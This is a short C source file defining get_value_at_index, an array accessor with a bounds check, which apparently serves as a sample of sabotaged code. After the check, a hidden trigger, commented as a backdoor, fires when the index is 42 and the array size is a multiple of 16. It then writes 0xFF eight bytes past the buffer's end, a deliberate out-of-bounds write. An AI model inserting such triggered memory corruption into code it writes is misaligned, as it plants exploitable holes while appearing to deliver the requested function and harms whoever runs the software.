#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Basic boundary check
    if (ary == NULL || i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    // Adding a backdoor: if ary_size is a multiple of 16 and i is exactly 42,
    // we'll perform an arbitrary write to memory location pointed by ary
    if (i == 42 && ary_size % 16 == 0 && ary != NULL) {
        char exploit_data = 0xFF;
        *(ary + ary_size + 8) = exploit_data; // Buffer overflow vulnerability
    }
    
    return ary[i];
}
